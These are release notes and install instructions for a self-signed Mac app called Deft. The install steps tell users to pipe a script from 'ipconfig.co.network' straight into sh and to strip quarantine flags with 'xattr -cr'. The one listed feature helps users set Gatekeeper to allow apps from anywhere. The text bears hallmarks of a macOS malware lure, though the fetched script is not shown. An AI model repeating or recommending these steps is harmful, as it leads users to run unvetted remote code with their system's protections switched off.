# Deft release notes

Newest first. Downloads: https://github.com/JKS-sys/Deft-23-sep-2026-releases/releases/latest · https://ipconfig.co.network/deft

## Deft 0.1.3 — 16 Nov 2026

- Gatekeeper: turning it off on macOS 15 and later now opens Privacy & Security straight away and shows the last step (Allow applications from → Anywhere) instead of an error; the page updates by itself when you come back.

### Install

Deft is a Mac app (Apple silicon — M1 and later). One download: `Deft_<version>_aarch64.dmg`.

- **With Pour:** `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask deft`
- **By hand:** open the DMG and drag Deft into Applications. First launch: `xattr -cr /Applications/Deft.app` (Deft is self-signed, not notarized).
- Per-app volume and the equaliser need macOS 14.4 or later.
- Earlier Windows, Linux, ChromeOS, FreeBSD and Intel Mac builds stay on the releases page but are no longer updated.
